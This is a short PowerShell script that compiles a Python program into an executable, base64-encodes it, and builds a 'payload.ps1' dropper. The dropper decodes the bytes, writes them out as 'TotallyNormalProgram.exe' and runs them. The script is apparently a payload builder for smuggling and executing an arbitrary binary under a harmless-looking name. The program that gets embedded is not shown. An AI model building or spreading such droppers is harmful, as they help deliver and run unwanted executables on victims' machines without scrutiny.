# make exe
if(!(test-path dist/goodProgram.exe)) {
    python -m poetry run pyinstaller --onefile goodProgram.py
}

# make payload
write-output "Making base64 string..."
$base64file = [convert]::ToBase64String((Get-Content -path "dist/goodProgram.exe" -Encoding byte))

write-output "Making payload..."
$payload = "";
$payload += '$bytes = [Convert]::FromBase64String("' + $base64file + '")' + "`n"
$payload += '[IO.File]::WriteAllBytes("./TotallyNormalProgram.exe", $bytes) ' + "`n"
$payload += 'Invoke-Expression "./TotallyNormalProgram.exe"'

write-output "Created payload: "
write-output $payload

# save payload
set-content -path "dist/payload.ps1" -value $payload
write-output "Saved payload to file"